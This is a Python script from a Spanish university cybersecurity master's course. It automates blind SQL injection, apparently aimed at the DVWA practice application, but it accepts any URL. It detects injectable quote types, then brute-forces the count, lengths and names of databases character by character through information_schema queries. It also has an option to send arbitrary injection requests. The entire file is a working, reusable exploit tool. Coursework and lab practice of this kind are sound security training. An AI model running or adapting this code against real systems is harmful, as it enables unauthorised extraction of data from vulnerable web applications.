#################################################################
# Autor: Miguel de la Cal Bravo                                 #
# Asignatura: Auditoría Web                                     #
# Módulo 3: Vulnerabilidades en la parte servidor               #
# UCLM - Máster en Ciberseguridad y Seguridad de la Información #
#################################################################

#! /usr/bin/python3
import sys
import requests
import string
from time import sleep

# Ejecutar: sudo pip3 install PrettyTable
from prettytable import PrettyTable

# Ejecutar: sudo pip3 install bs4
from bs4 import BeautifulSoup

#########################################################################
# Inicialización de variables del programa y comprobación de argumentos #
#########################################################################

def init_variables():

    # Comprobamos el número de argumentos de la línea de comandos
    if len(sys.argv) not in [5, 6]:
        print(f'\033[91m\n[ERROR] USAGE: $ python3 dvwa_sqli_blind_text.py <URL> <PARAMETER> <PARAMETER_VALUE> <EXPECTED_TRUE_OUTPUT> [<PHPSESSID>]\033[0m\n')
        sys.exit(2)
    else:
        # Definimos la url base, parámetro GET, valor del parámetro y salida correcta esperada
        base_url = str(sys.argv[1])
        base_url += "?" + str(sys.argv[2]) + "="
        print(f'\n[INFO] La dirección URL base es: {base_url}')
        parameter_value = str(sys.argv[3])
        expected_true_output = str(sys.argv[4])
        cookies = {}

        # Establecemos las cookies necesarias para realizar las peticiones
        if len(sys.argv) == 6:
            dvwa_security_level = "low"
            phpsessid = str(sys.argv[5])
            cookies = {'security': dvwa_security_level, 'PHPSESSID': phpsessid}

    return base_url, cookies, parameter_value, expected_true_output


##################################################
# PASO 0: Comprobar vulnerabilidad SQL Injection #
##################################################

def paso_0():
    
    print(f'\n\033[95m\033[1m------------ PASO 0 - Comprobar vulnerabilidad SQL Injection -------------------------------------------------\033[0m\n')
    
    blind_sqli_vuln_type = "None"
    
    # Comprobamos los diferentes tipos de vulnerabilidades SQL Injection
    for vuln_type in ["\'", "\"", ""]:
        print(f"[INFO] Comprobando vulnerabilidad Blind SQL Injection con: {vuln_type} ...")
        url1 = base_url + f"{parameter_value}{vuln_type} and 1={vuln_type}1" + "&Submit=Submit#"
        url2 = base_url + f"{parameter_value}{vuln_type} and 1={vuln_type}0" + "&Submit=Submit#"    
        
        r1 = requests.get(url1, cookies=cookies)
        sleep(0.5)
        r2 = requests.get(url2, cookies=cookies)
        sleep(0.5)

        # Si no captura bien el content-length de la petición, comentar esa condición del if
        if((r1.headers.get('content-length') != r2.headers.get('content-length')) and (expected_true_output not in r2.text)):
            blind_sqli_vuln_type = vuln_type
            print(f'\033[92m[SUCCESS] ¡¡Vulnerabilidad Blind SQL Injection con: {blind_sqli_vuln_type} !!\033[0m')
            break
        else:
            print(f'\033[91m[FAILED] Vulnerabilidad no encontrada con {vuln_type}\033[0m')
            
    if(blind_sqli_vuln_type == "None"):
        print(f'\033[91m[FAILED] No se han encontrado vulnerabilidades SQL Injection :(\n\t Por si acaso, revisa si el PHPSESSID ha sido introducido incorrectamente\n\t Saliendo del programa...\033[0m')
        sys.exit(2)

    return blind_sqli_vuln_type


################################################################
# PASO 1: Identificamos el numero de bases de datos existentes #
################################################################

def paso_1():

    print(f'\n\033[95m\033[1m------------ PASO 1 - Calcular el nº total de bases de datos -------------------------------------------------\033[0m\n')

    for i in range(1, 100):
        # Formamos la url y realizamos la petición
        url = base_url + parameter_value + blind_sqli_vuln_type + "and (select count(schema_name) from information_schema.schemata)=" \
            + str(i) + " -- -&Submit=Submit#"
        r = requests.get(url, cookies=cookies)

        # Sleep entre peticiones, realiza 10 peticiones por segundo
        sleep(0.1)

        # Comprobamos si se detecta el usuario admin en el contenido de la respuesta
        if expected_true_output in r.text:
            total_databases = i
            # salimos del bucle si hemos encontrado el nº total de bases de datos correcto
            break;

    # Imprimimos en una tabla el número total de bases de datos
    t1 = PrettyTable(['Nº de bases de datos'])
    t1.add_row([total_databases])
    print(t1)
    print(f'\n[INFO] Paso 1 completado satisfactoriamente')
    return total_databases


###############################################################
# PASO 2: Identificamos el tamaño de todas las bases de datos #
###############################################################

def paso_2(total_databases):
    print(f'\n\033[95m\033[1m------------ PASO 2 - Calcular el nº de caracteres de cada una de las bases de datos -------------------------\033[0m\n')

    total_characters_per_db = [] # Lista de número de caracteres de cada base de datos

    t2 = PrettyTable(['# Base de datos', 'Nº de caracteres'])   

    for i in range(total_databases):
        # Identificamos el tamaño de cada una de las bases de datos
        for j in range(1, 65):
            # Formamos la url
            url = base_url + parameter_value + blind_sqli_vuln_type + " and (select length(schema_name) from information_schema.schemata limit " \
                + str(i) + ",1)=" + str(j) + " -- -&Submit=Submit#"
            r = requests.get(url, cookies=cookies)

            # Sleep entre peticiones, realiza 10 peticiones por segundo
            sleep(0.1)

            # Comprobamos si se detecta el usuario admin en el contenido de la respuesta
            if expected_true_output in r.text:
                total_characters_per_db.append(j)
                # Imprimimos el tamaño de cada una de las bases de datos
                print(f'\033[92m[SUCCESS] El nombre de la base de datos #{i} contiene {j} caracteres\033[0m')
                # salimos del bucle si hemos encontrado el nº de caracteres correcto
                break;

        # Añadimos a la tabla el número de caracteres de la base de datos
        t2.add_row([i, total_characters_per_db[i]])

    # Imprimimos la tabla final con el número de caracteres de todas las bases de datos
    print(f'\n{t2}')
    print(f'\n[INFO] Paso 2 completado satisfactoriamente')
    return total_characters_per_db


###############################################################################
# PASO 3: Identificamos los caracteres que conforman todas las bases de datos #
###############################################################################

def paso_3(total_databases, total_characters_per_db):

    print(f'\n\033[95m\033[1m------------ PASO 3 - Identificar carácter a carácter el nombre de cada una de las bases de datos ------------\033[0m\n')

    database_names_list = [] # Lista de nombres de cada base de datos

    t3 = PrettyTable(['# Base de datos', 'Nombre de la base de datos'])

    for i in range(total_databases):
        i_db_name = "" # nombre que queremos identificar de la base de datos i
        # Recorrermos caracter a caracter del nombre de cada base de datos
        for j in range(total_characters_per_db[i] + 1):
            # Fuerza bruta de caracteres del alfabeto en minúsculas más el - _ y espacio
            chars_brute_force = string.ascii_lowercase + string.digits + '-_ ' + string.ascii_uppercase
            for char in (chars_brute_force):
                # Formamos la url
                url = base_url + parameter_value + blind_sqli_vuln_type + " and substring((select schema_name from information_schema.schemata limit " \
                    + str(i) + ",1)," + str(j) + ",1)=\'" + str(char) + "\' -- -&Submit=Submit#"
                r = requests.get(url, cookies=cookies)
                
                # Sleep entre peticiones, realiza 10 peticiones por segundo
                sleep(0.1)
                
                # Comprobamos si se detecta el usuario admin en el contenido de la respuesta
                if expected_true_output in r.text:
                    i_db_name = i_db_name + str(char)
                    # salimos del bucle si hemos encontrado el carácter correcto
                    break;

        # Añadimos a la lista el nombmre de cada una de las bases de datos
        database_names_list.append(i_db_name.replace(" ",""))
        # Imprimimos el tamaño de cada una de las bases de datos
        print(f'\033[92m[SUCCESS] El nombre de la base de datos #{i} es: {database_names_list[i]}\033[0m')
        # Añadimos a la tabla el número de caracteres de la base de datos
        t3.add_row([i, database_names_list[i]])
        
    # Imprimimos la tabla final con el número de caracteres de todas las bases de datos
    print(f'\n{t3}')
    print(f'\n[INFO] Paso 3 completado satisfactoriamente')
    return database_names_list

##################################################################################
# FUNCIÓN EXPERIMENTAL: Lanzar consultas personalizadas sobre la aplicación DVWA # 
##################################################################################

def lanzar_consulta():
    print(f'\n[INFO] La dirección URL base es: {base_url}')
    custom_request = str(input(f'\nIntroduce la petición personalizada a partir de la URL base: '))
    
    # Formamos la url y realizamos la petición
    url = base_url + custom_request + "&Submit=Submit#"
    print(f'\n[INFO] Realizando petición a: {url}')
    r = requests.get(url, cookies=cookies)

    if("pre" in r.text):
        soup = BeautifulSoup(r.text, "html.parser")
        custom_response = soup.find("pre").contents
        print(f'\033[92m[SUCCESS] Respuesta obtenida a la petición realizada:\n{custom_response}\033[0m')
    else:
        print(f'\n\033[91m[FAILED] No se ha obtenido información extra en la petición realizada :(\033[0m')

#####################
# Menú del programa #
#####################

def menu(base_url, cookies, blind_sqli_vuln_type, expected_true_output):
    print(f'\n--------------------------------------------------------------------------------------------------------------')
    print(f"\nAcciones y funcionalidades disponibles:\n\n" \
            "\t[1] Calcular el nº total de bases de datos\n" \
            "\t[2] Calcular el nº de caracteres de cada una de las bases de datos\n" \
            "\t[3] Identificar carácter a carácter el nombre de cada una de las bases de datos\n" \
            "\t[4] Lanzar petición personalizada (experimental, solo para DVWA)\n" \
            "\t[5] Salir del programa")
    
    menu_option = str(input(f'\nSelecciona la acción del menú [1-5] (intro para opción por defecto [3]): '))
    
    # Configuración de las acciones menú
    if(menu_option == "1"):
        total_databases = paso_1()
    elif(menu_option == "2"):
        total_databases = paso_1()
        total_characters_per_db = paso_2(total_databases)
    elif(menu_option == "3" or menu_option == ""):
        total_databases = paso_1()
        total_characters_per_db = paso_2(total_databases)
        database_names_list = paso_3(total_databases, total_characters_per_db)       
    elif(menu_option == "4"):
        lanzar_consulta()
    elif(menu_option == "5"):
        print(f'\n[INFO] Saliendo del programa...')
        sys.exit(2)
    else:
        print(f'La opción seleccionada [{menu_option}] no es válida. Por favor, marque una opción del [1-5]')


########
# Main #
########

def main():
    while(1):
        menu(base_url, cookies, blind_sqli_vuln_type, expected_true_output)

if __name__ == "__main__":
    # Inicializamos las variables de url_base, cookies y expected_true_output
    base_url, cookies, parameter_value, expected_true_output = init_variables()
    # Comprobamos si hay vulnerabilidad SQL Injection en la url_base
    blind_sqli_vuln_type = paso_0()
    # Llamamos a la función main para el menú de opciones
    main()